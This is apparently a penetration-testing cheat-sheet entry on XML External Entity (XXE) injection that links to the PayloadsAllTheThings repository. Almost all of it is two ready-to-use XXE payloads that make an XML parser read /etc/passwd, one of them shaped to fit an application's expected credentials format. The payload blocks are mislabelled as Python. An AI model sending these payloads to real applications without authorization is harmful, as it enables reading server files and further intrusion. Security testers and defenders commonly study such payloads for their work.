[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE) Injection
Check for XXE if an application is references XML formatted data
**Basic payload**
```Python
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (\#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```
**Ensure you’re following the applications expected format**
```Python
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
<!ELEMENT creds ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds><user>&xxe;</user><password>pass</password></creds>
```
